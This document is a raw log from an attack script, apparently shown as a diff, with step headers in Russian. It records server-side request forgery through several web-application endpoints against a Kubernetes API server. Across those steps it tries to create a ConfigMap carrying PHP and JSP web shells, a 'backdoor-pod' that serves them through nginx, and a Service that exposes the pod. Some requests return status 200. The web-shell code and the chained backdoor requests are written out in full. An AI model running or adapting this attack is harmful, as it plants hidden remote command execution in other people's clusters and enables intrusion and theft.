+[2025-12-10 17:51:48] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if (reques...
+[2025-12-10 17:51:48] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:49] [INFO]   Response status: 422
+[2025-12-10 17:51:49] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if...
+[2025-12-10 17:51:49] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:50] [INFO]   Response status: 401
+[2025-12-10 17:51:50] [INFO]   Response: ...
+[2025-12-10 17:51:50] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc:443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:51] [INFO]   Response status: 401
+[2025-12-10 17:51:51] [INFO]   Response: ...
+[2025-12-10 17:51:51] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> https://10.96.0.1/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:51] [INFO]   Response status: 401
+[2025-12-10 17:51:51] [INFO]   Response: ...
+[2025-12-10 17:51:51] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> http://kubernetes.default.svc/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:52] [INFO]   Response status: 401
+[2025-12-10 17:51:52] [INFO]   Response: ...
+[2025-12-10 17:51:52] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> http://127.0.0.1:6443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:53] [INFO]   Response status: 401
+[2025-12-10 17:51:53] [INFO]   Response: ...
+[2025-12-10 17:51:53] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> http://localhost:6443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:54] [INFO]   Response status: 401
+[2025-12-10 17:51:54] [INFO]   Response: ...
+[2025-12-10 17:51:54] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:54] [INFO]   Response status: 401
+[2025-12-10 17:51:54] [INFO]   Response: ...
+[2025-12-10 17:51:54] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:55] [INFO]   Response status: 401
+[2025-12-10 17:51:55] [INFO]   Response: ...
+[2025-12-10 17:51:55] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:56] [INFO]   Response status: 401
+[2025-12-10 17:51:56] [INFO]   Response: ...
+[2025-12-10 17:51:56] [INFO] Creating ConfigMap via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:57] [INFO]   Response status: 401
+[2025-12-10 17:51:57] [INFO]   Response: ...
+[2025-12-10 17:51:57] [INFO] 
+======================================================================
+[2025-12-10 17:51:57] [INFO] ШАГ 3: Создание Pod с бекдором
+[2025-12-10 17:51:57] [INFO] ======================================================================
+[2025-12-10 17:51:57] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/default/pods
+[2025-12-10 17:51:58] [INFO]   Response status: 405
+[2025-12-10 17:51:58] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:58] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc:443/api/v1/namespaces/default/pods
+[2025-12-10 17:51:59] [INFO]   Response status: 405
+[2025-12-10 17:51:59] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:59] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> https://10.96.0.1/api/v1/namespaces/default/pods
+[2025-12-10 17:52:01] [INFO]   Response status: 405
+[2025-12-10 17:52:01] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:01] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> http://kubernetes.default.svc/api/v1/namespaces/default/pods
+[2025-12-10 17:52:02] [INFO]   Response status: 405
+[2025-12-10 17:52:02] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:02] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> http://127.0.0.1:6443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:03] [INFO]   Response status: 405
+[2025-12-10 17:52:03] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:03] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> http://localhost:6443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:05] [INFO]   Response status: 405
+[2025-12-10 17:52:05] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:05] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/api/v1/namespaces/default/pods
+[2025-12-10 17:52:06] [INFO]   Response status: 405
+[2025-12-10 17:52:06] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:06] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/pods
+[2025-12-10 17:52:07] [INFO]   Response status: 405
+[2025-12-10 17:52:07] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:07] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/pods
+[2025-12-10 17:52:08] [INFO]   Response status: 405
+[2025-12-10 17:52:08] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:08] [INFO] Creating Pod via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/pods
+[2025-12-10 17:52:10] [INFO]   Response status: 405
+[2025-12-10 17:52:10] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:10] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/pods
+[2025-12-10 17:52:10] [INFO]   Response status: 200
+[2025-12-10 17:52:10] [INFO]   Response: {}...
+[2025-12-10 17:52:10] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc:443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:11] [INFO]   Response status: 200
+[2025-12-10 17:52:11] [INFO]   Response: {}...
+[2025-12-10 17:52:11] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> https://10.96.0.1/api/v1/namespaces/default/pods
+[2025-12-10 17:52:12] [INFO]   Response status: 200
+[2025-12-10 17:52:12] [INFO]   Response: {}...
+[2025-12-10 17:52:12] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> http://kubernetes.default.svc/api/v1/namespaces/default/pods
+[2025-12-10 17:52:13] [INFO]   Response status: 200
+[2025-12-10 17:52:13] [INFO]   Response: {}...
+[2025-12-10 17:52:13] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> http://127.0.0.1:6443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:13] [INFO]   Response status: 200
+[2025-12-10 17:52:13] [INFO]   Response: {}...
+[2025-12-10 17:52:13] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> http://localhost:6443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:14] [INFO]   Response status: 200
+[2025-12-10 17:52:14] [INFO]   Response: {}...
+[2025-12-10 17:52:14] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/api/v1/namespaces/default/pods
+[2025-12-10 17:52:15] [INFO]   Response status: 200
+[2025-12-10 17:52:15] [INFO]   Response: {}...
+[2025-12-10 17:52:15] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/pods
+[2025-12-10 17:52:16] [INFO]   Response status: 200
+[2025-12-10 17:52:16] [INFO]   Response: {}...
+[2025-12-10 17:52:16] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/pods
+[2025-12-10 17:52:16] [INFO]   Response status: 200
+[2025-12-10 17:52:16] [INFO]   Response: {}...
+[2025-12-10 17:52:16] [INFO] Creating Pod via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/pods
+[2025-12-10 17:52:17] [INFO]   Response status: 200
+[2025-12-10 17:52:17] [INFO]   Response: {}...
+[2025-12-10 17:52:17] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/pods
+[2025-12-10 17:52:18] [INFO]   Response status: 422
+[2025-12-10 17:52:18] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": \"/usr/share/nginx/html\"}...
+[2025-12-10 17:52:18] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc:443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:18] [INFO]   Response status: 422
+[2025-12-10 17:52:18] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc:443/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": \"/usr/share/nginx/htm...
+[2025-12-10 17:52:18] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://10.96.0.1/api/v1/namespaces/default/pods
+[2025-12-10 17:52:19] [INFO]   Response status: 422
+[2025-12-10 17:52:19] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://10.96.0.1/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": \"/usr/share/nginx/html\"}]}], \"volume...
+[2025-12-10 17:52:19] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://kubernetes.default.svc/api/v1/namespaces/default/pods
+[2025-12-10 17:52:20] [INFO]   Response status: 422
+[2025-12-10 17:52:20] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"http://kubernetes.default.svc/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": \"/usr/share/nginx/html\"}]...
+[2025-12-10 17:52:20] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://127.0.0.1:6443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:21] [INFO]   Response status: 422
+[2025-12-10 17:52:21] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"http://127.0.0.1:6443/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": \"/usr/share/nginx/html\"}]}], \"vo...
+[2025-12-10 17:52:21] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://localhost:6443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:21] [INFO]   Response status: 422
+[2025-12-10 17:52:21] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"http://localhost:6443/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": \"/usr/share/nginx/html\"}]}], \"vo...
+[2025-12-10 17:52:21] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/api/v1/namespaces/default/pods
+[2025-12-10 17:52:22] [INFO]   Response status: 422
+[2025-12-10 17:52:22] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": \"/usr/share/nginx/htm...
+[2025-12-10 17:52:22] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/pods
+[2025-12-10 17:52:23] [INFO]   Response status: 422
+[2025-12-10 17:52:23] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": \"/usr/share/nginx/...
+[2025-12-10 17:52:23] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/pods
+[2025-12-10 17:52:24] [INFO]   Response status: 422
+[2025-12-10 17:52:24] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": \"/usr/s...
+[2025-12-10 17:52:24] [INFO] Creating Pod via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/pods
+[2025-12-10 17:52:25] [INFO]   Response status: 422
+[2025-12-10 17:52:25] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/pods","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"backdoor-pod\", \"namespace\": \"default\"}, \"spec\": {\"containers\": [{\"name\": \"backdoor\", \"image\": \"nginx:latest\", \"ports\": [{\"containerPort\": 80}], \"volumeMounts\": [{\"name\": \"backdoor\", \"mountPath\": ...
+[2025-12-10 17:52:25] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/default/pods
+[2025-12-10 17:52:25] [INFO]   Response status: 401
+[2025-12-10 17:52:25] [INFO]   Response: ...
+[2025-12-10 17:52:25] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc:443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:26] [INFO]   Response status: 401
+[2025-12-10 17:52:26] [INFO]   Response: ...
+[2025-12-10 17:52:26] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> https://10.96.0.1/api/v1/namespaces/default/pods
+[2025-12-10 17:52:27] [INFO]   Response status: 401
+[2025-12-10 17:52:27] [INFO]   Response: ...
+[2025-12-10 17:52:27] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> http://kubernetes.default.svc/api/v1/namespaces/default/pods
+[2025-12-10 17:52:28] [INFO]   Response status: 401
+[2025-12-10 17:52:28] [INFO]   Response: ...
+[2025-12-10 17:52:28] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> http://127.0.0.1:6443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:29] [INFO]   Response status: 401
+[2025-12-10 17:52:29] [INFO]   Response: ...
+[2025-12-10 17:52:29] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> http://localhost:6443/api/v1/namespaces/default/pods
+[2025-12-10 17:52:29] [INFO]   Response status: 401
+[2025-12-10 17:52:29] [INFO]   Response: ...
+[2025-12-10 17:52:29] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/api/v1/namespaces/default/pods
+[2025-12-10 17:52:30] [INFO]   Response status: 401
+[2025-12-10 17:52:30] [INFO]   Response: ...
+[2025-12-10 17:52:30] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/pods
+[2025-12-10 17:52:31] [INFO]   Response status: 401
+[2025-12-10 17:52:31] [INFO]   Response: ...
+[2025-12-10 17:52:31] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/pods
+[2025-12-10 17:52:32] [INFO]   Response status: 401
+[2025-12-10 17:52:32] [INFO]   Response: ...
+[2025-12-10 17:52:32] [INFO] Creating Pod via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/pods
+[2025-12-10 17:52:33] [INFO]   Response status: 401
+[2025-12-10 17:52:33] [INFO]   Response: ...
+[2025-12-10 17:52:33] [INFO] 
+======================================================================
+[2025-12-10 17:52:33] [INFO] ШАГ 4: Создание Service для доступа к бекдору
+[2025-12-10 17:52:33] [INFO] ======================================================================
+[2025-12-10 17:52:33] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/default/services
+[2025-12-10 17:52:34] [INFO]   Response status: 405
+[2025-12-10 17:52:34] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:34] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc:443/api/v1/namespaces/default/services
+[2025-12-10 17:52:35] [INFO]   Response status: 405
+[2025-12-10 17:52:35] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:35] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> https://10.96.0.1/api/v1/namespaces/default/services
+[2025-12-10 17:52:37] [INFO]   Response status: 405
+[2025-12-10 17:52:37] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:37] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> http://kubernetes.default.svc/api/v1/namespaces/default/services
+[2025-12-10 17:52:38] [INFO]   Response status: 405
+[2025-12-10 17:52:38] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:38] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> http://127.0.0.1:6443/api/v1/namespaces/default/services
+[2025-12-10 17:52:40] [INFO]   Response status: 405
+[2025-12-10 17:52:40] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:40] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> http://localhost:6443/api/v1/namespaces/default/services
+[2025-12-10 17:52:41] [INFO]   Response status: 405
+[2025-12-10 17:52:41] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:41] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/api/v1/namespaces/default/services
+[2025-12-10 17:52:42] [INFO]   Response status: 405
+[2025-12-10 17:52:42] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:52:42] [INFO] Creating Service via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/services
+[2025-12-10 17:52:44] [INFO]   Response status: 405
